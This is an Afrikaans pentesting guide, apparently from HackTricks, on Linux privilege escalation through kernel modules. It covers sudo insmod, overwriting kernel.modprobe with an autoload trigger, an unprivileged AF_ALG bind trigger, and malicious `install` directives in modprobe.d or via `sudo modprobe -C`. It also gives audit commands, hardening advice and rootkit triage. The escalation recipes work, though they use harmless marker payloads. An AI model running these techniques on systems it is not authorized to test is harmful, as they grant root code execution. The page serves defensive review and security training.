# Kernemodules en misbruik van modprobe

{{#include ../../banners/hacktricks-training.md}}

## Wanopstellings met kernmodules en die laai van modules

Ondersteuning vir kernmodules is ’n gebied met ’n groot impak tydens ’n hersiening van Linux privilege escalation. Moenie elke boodskap oor unsigned modules op sigself as uitbuitbaar beskou nie, maar gebruik dit om praktiese vrae te beantwoord.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Kan die huidige gebruiker modules laai deur `sudo`, capabilities of ’n skryfbare helperpad?
- Is die laai van modules steeds geaktiveer?
- Is afdwinging van modulehandtekeninge gedeaktiveer?
- Is modulegidse, modulelêers of `modprobe.d`-opstellingpaaie skryfbaar?<sup>[[16]](#references)</sup>
- Kan kernlogboeke gelees word om te bevestig wat gebeur het?

Vinnige triage begin met die volgende kontroles van modulestatus, handtekeninge, logging en die moduleboom.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretasie:

- `modules_disabled=1` beteken modules kan nie gelaai of ontlaai word nie, en die waarde kan nie tot `0` teruggestel word voordat die stelsel herlaai is nie.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` op die kernopdragreël of `CONFIG_MODULE_SIG_FORCE=y` vereis geldig ondertekende modules; andersins kan ongetekende modules gelaai word en die kern besoedel.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` plaas geen beperking op `dmesg` nie; wanneer dit `1` is, vereis toegang `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Skryfbare paaie onder `/lib/modules/$(uname -r)/` is gevaarlik omdat `modprobe` daardie boom en sy afhanklikheidsdata deursoek wanneer modules gelaai word.<sup>[[8]](#references)</sup>

### Laai van 'n module en lees van kernuitvoer

As jy geldige toestemming het om 'n plaaslike module te laai, plaas `insmod` die presiese `.ko`-lêer wat jy verskaf in die kern. Die module se init-funksie word as deel van die laaiproses uitgevoer, en boodskappe wat met `printk()` geskryf word, gaan na die kernlogbuffer, wat gewoonlik met `dmesg` gelees word.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

'n Minimale hersieningswerkvloei gebruik `modinfo` om metadata te inspekteer, `insmod` en `rmmod` om 'n module te laai en te verwyder, `lsmod` om te bevestig dat dit gelaai is, en `dmesg` om kernlogboeke te inspekteer.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

As `sudo -l` `insmod`, `modprobe` of 'n omhulsel daarom toelaat, beskou dit as kritiek: `sudo -l` lys die aanroepende gebruiker se voorregte, en om 'n kernmodule te laai, vereis `CAP_SYS_MODULE`. Sien [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) vir direkte vermoë-gebaseerde paaie.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` wat deur sudo toegelaat word

’n sudo-reël wat ’n gebruiker toelaat om `insmod` uit te voer, is nie vergelykbaar met toestemming om ’n gewone administratiewe hulpprogram te gebruik nie. Die module se initialiseringskode loop as deel van die invoeging, dus is die praktiese vraag tydens die hersiening of hierdie gebruiker die module wat gelaai word, kan kies of wysig.<sup>[[3]](#references)</sup>

Die volgende algemene hersieningsvloei herhaal daardie inspeksie-, laai-, status-, log- en verwyderingstoetse vir ’n kandidaatmodule.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

As die gebruiker ’n arbitrêre `.ko` kan verskaf, moet die reël tydens ’n gemagtigde assessering as ’n volledige stelselkompromittering beskou word. ’n Veiliger operasionele patroon is om nie die laai van modules via sudo te delegeer nie; as dit onvermydelik is, beperk die presiese pad, eienaarskap, toestemmings, ondertekeningsbeleid en verwyderingswerkvloei.<sup>[[3]](#references)[[10]](#references)</sup>

Vir ’n onskadelike patroon om modules in ’n beheerde laboratorium te bou, word ’n minimale bronlêer en Makefile hieronder getoon; die vorm `make -C /lib/modules/$(uname -r)/build M=$PWD` volg die kern se gedokumenteerde kbuild-werkvloei vir eksterne modules.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Bou en laai slegs in ’n gemagtigde laboratorium; kbuild bou die eksterne module, en die laai-/verwyder-opdragte roep die kernmodule-koppelvlakke aan.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Kontroles vir misbruik van `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` benoem die userspace-helper wat die kernel uitvoer vir outomatiese modulelaaiversoeke; hierdie sysctl beïnvloed outomatiese laai, nie eksplisiete module-invoeging nie. As ’n aanvaller dit kan verander na ’n skryfbare uitvoerbare pad en ’n moduleversoek kan veroorsaak, word daardie helper ’n bevoorregte kode-uitvoeringspad. As dit op die leë string gestel word, word outomatiese laaiversoeke gedeaktiveer; as `CONFIG_STATIC_USERMODEHELPER=y`, word ’n nie-leë waarde oorskryf deur die ingeboude statiese helperpad.<sup>[[1]](#references)</sup>

Kontroleer die huidige helperpad via die kernel se sysctl-koppelvlak en inspekteer die teiken se eienaarskap en modus.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Kyk of sysctl, gedelegeerde sudo-reëls of lêervermoëns beïnvloed kan word.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Die volgende patroon, wat slegs vir laboratoriumgebruik bedoel is, verander die helper-pad en veroorsaak ’n gedokumenteerde module-outolaai-versoek; gebruik dit slegs op ’n geïsoleerde, gemagtigde stelsel.<sup>[[1]](#references)</sup>

Moenie op huidige Linux-kerne ’n onbekende uitvoerbare lêer as ’n algemene sneller gebruik nie: verouderde outolaai van modules vir pasgemaakte binêre formate is in Linux 6.14 verwyder, terwyl die kerndokumentasie ’n onbekende lêerstelseltipe as ’n pad vir ’n module-outolaai-versoek identifiseer.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Op geharde stelsels behoort dit te misluk wanneer toestemmings onbevoorregte skryftoegang tot `kernel.modprobe` verhoed, die helper-pad nie skryfbaar is nie, of module-outolaai gedeaktiveer is.<sup>[[1]](#references)</sup>

### Onbevoorregte AF_ALG-outolaai-sneller

Die lêerstelsel-sneller hierbo gebruik bevoorregte `mount`.<sup>[[1]](#references)</sup> Waar AF_ALG-sokke beskikbaar is, kan ’n onbevoorregte gebruiker eerder een aan ’n doelbewus niebestaande tipe bind.<sup>[[17]](#references)[[18]](#references)</sup> `alg_bind()` versoek dan `algif-<type>` via `request_module()`, wat die gekonfigureerde module-helper aanroep.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Dit werk steeds ná Linux 6.14 se verwydering van outolaai van die verouderde onbekende-binêreformaat.<sup>[[11]](#references)[[17]](#references)</sup> ’n Mislukte `bind()` is te wagte omdat die tipe nie bestaan nie; kontroleer die helper se newe-effek eerder as die sok se terugkeerwaarde.<sup>[[17]](#references)[[18]](#references)</sup>

Reël eers in ’n gemagtigde laboratorium die beheerde helper of `modprobe.d`-reël op, en aktiveer dan een versoek sonder `sudo` of `CAP_SYS_MODULE`.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ aanvaar ’n AF_ALG-bindtuple `(type, name)`.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Hierdie pad vereis ’n bruikbare AF_ALG-soket en ’n nie-leë `kernel.modprobe`.<sup>[[1]](#references)[[18]](#references)</sup> Op kernels met `/proc/sys/crypto/af_alg_restrict` deaktiveer waarde `2` die skep van AF_ALG-sokette; waarde `1` beperk algoritmes, maar keer nie die versoek vir ’n ontbrekende tipe in `alg_bind()` nie.<sup>[[18]](#references)[[21]](#references)</sup> ’n LSM kan die moduleversoek weier voordat die helper opgeroep word.<sup>[[19]](#references)</sup>

### Skryfbare `modprobe.d`-konfigurasie en `sudo modprobe -C`

Voordat ’n module opgelos word, lees `modprobe` `.conf`-lêers uit konfigurasiegidse soos `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` en `/lib/modprobe.d`, in volgorde van voorrang. ’n Lêer met dieselfde naam in ’n gids met hoër voorrang oorskadu die lêer met laer voorrang. Belangriker nog, ’n `install <module> <command>`-direktief voer ’n arbitrêre dopopdrag uit **in plaas daarvan om** daardie module in te voeg. ’n Skryfbare konfigurasiepad kan dus lei tot vertraagde opdraguitvoering met die aanmeldbewyse van ’n latere bevoorregte `modprobe`-oproeper; kernmodulehandtekeningafdwinging verifieer nie hierdie gebruikersruimte-opdrag nie.<sup>[[16]](#references)</sup>

Oudit die toestemmings vir gidse en lêers, en inspekteer dan die effektiewe konfigurasie. `modprobe -n -v` is veilig vir die hersiening van resolusie, omdat droëloopmodus nóg die module invoeg nóg ’n `install`/`remove`-opdrag uitvoer. Verkies `modprobe -c` bo die verouderde `--showconfig`-skryfwyse, wat huidige kmod-dokumentasie aandui vir verwydering ná kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

’n Onbeperkte sudo-reël vir `modprobe` is uitbuitbaar selfs wanneer arbitrêre `.ko`-lêers nie handtekeningverifikasie kan slaag nie: `-C` kies ’n aanvaller-beheerde konfigurasi gids, waaruit ’n `install`-opdrag deur die sudo-gelanseerde proses uitgevoer kan word.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

As ’n `modprobe.d`-gids wat vir die kernel se helper sigbaar is skryfbaar is, kan dieselfde [AF_ALG-autoload-sneller](#unprivileged-af_alg-autoload-trigger) onmiddellik ’n `install algif-htprobe`-instruksie uitvoer, sonder om te wag dat ’n administrateur `modprobe` aanroep.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> Plaas in ’n gemagtigde lab ’n onskadelike marker-opdrag in ’n skryfbare `.conf`, bevestig die resolusie met `modprobe -n -v algif-htprobe`, en voer dan die sneller hierbo uit.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` en afdwinging van modulesignature blokkeer module-invoeging, nie hierdie userspace-`install`-opdrag nie; ’n leë `kernel.modprobe` of ’n geblokkeerde AF_ALG-pad verhoed wel hierdie autoload-roete.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Vir versagting, moenie `modprobe` met onbeperkte argumente via sudo toestaan nie; hou elke konfigurasiegids root-besit en nie-skryfbaar nie, en hersien onverwagte `install`-/`remove`-aanwysings. Wanneer ’n vertroude administratiewe werksvloei sulke aanwysings vir een module moet omseil, ignoreer `modprobe --ignore-install` dit vir daardie benoemde module, maar afhanklikhede kan steeds hul eie opdragte hê.<sup>[[8]](#references)[[16]](#references)</sup>

### Hersiening van skryfbare `/lib/modules`

Skryfbare modulegidse kan modulevervanging, die plant van kwaadwillige modules of misbruik van outo-laai moontlik maak, afhangend van hoe `modprobe` later aangeroep word; `modprobe` soek in `/lib/modules/$(uname -r)` en gebruik die afhanklikheidsdata daarvan wanneer modules opgelos word.<sup>[[8]](#references)</sup>

Hersien skryfbare modulelêers en afhanklikheids-/aliasmetadata onder die moduleboom van die aktiewe kernelweergawe.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

As jy skryfbare module-inhoud vind, ondersoek hoe `modprobe` afhanklikhede oplos en hoe `modinfo` modulemetadata rapporteer.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Verdedigingsnotas:

- Hou `/lib/modules` in besit van `root:root` en maak dit nie-skryfbaar vir gebruikers nie.<sup>[[8]](#references)</sup>
- Stel `kernel.modules_disabled=1` ná selflaai in waar dit operasioneel moontlik is.<sup>[[1]](#references)</sup>
- Dwing module-ondertekening af op stelsels wat laaibare modules vereis.<sup>[[2]](#references)</sup>
- Monitor skryfbewerkings na `/proc/sys/kernel/modprobe`, `/lib/modules` en die `modprobe.d`-konfigurasiegidse, asook onverwagte uitvoering van `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Module-gebaseerde rootkit-triage

’n Kwaadwillige module kan syscalls, VFS- of `/proc`-aansigte, netwerkpaaie of geloofsbriewekontroles haak om prosesse en lêers te versteek, verkeer te herlei of geheime te onderskep. Dit kan homself ook uit die modulelys verwyder wat deur `lsmod` vertoon word. Volharding kan afkomstig wees van `modprobe.d`-aliasse of installasiereëls, `/etc/modules-load.d`, ’n systemd-eenheid, initramfs-inhoud of die vervanging van ’n wettige `.ko`-lêer. ’n Normale `lsmod`-resultaat is nuttige bewys, maar ’n kompromittering op kernvlak kan lyste wat deur die kern verskaf word onbetroubaar maak. Vergelyk gelaaide modules, lêers op die skyf, selflaaikonfigurasie, modulelaailogboeke en betroubare eksterne telemetrie.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Hersien onverwagte modulename, paaie, afhanklikhede, handtekeninge en laaitye. Kernel-taint- en ongetekende-moduleboodskappe is leidrade, nie bewys nie. As ’n rootkit vermoed word, versamel bewyse vanaf ’n vertroude beeld of herstelomgewing voordat jy op lewendige kernel-uitset staatmaak. Die bladsy oor [kernel-kwesbaarheidsassessering](kernel-vulnerability-assessment.md) dek konfigurasie en diagnostiese blootstelling, insluitend tracefs en vasgepende BPF-objekte.



## References

- [1] [Dokumentasie vir /proc/sys/kernel/ — Die Linux-kerneldokumentasie](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel-moduleondertekeningsfasiliteit — Die Linux-kerneldokumentasie](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux-manbladsy](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux-manbladsy](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Drywergrondbeginsels — Die Linux-kerneldokumentasie](https://docs.kernel.org/driver-api/basics.html)
- [6] [Boodskapregistrasie met printk — Die Linux-kerneldokumentasie](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Bou van eksterne modules — Die Linux-kerneldokumentasie](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux-manbladsy](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux-manbladsy](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux-manbladsy](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Samevoeging van merker 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux-manbladsy](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux-manbladsy](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux-manbladsy](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux-manbladsy](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux-manbladsy](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Herlewing van die modprobe_path-tegniek: Omseiling van die search_binary_handler()-pleister — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [AF_ALG-bind en moduleversoek — Linux-kernbronkode](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Modulehelper-aanroeping — Linux-kernbronkode](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Python-dokumentasie](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Linux-kerneldokumentasie](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
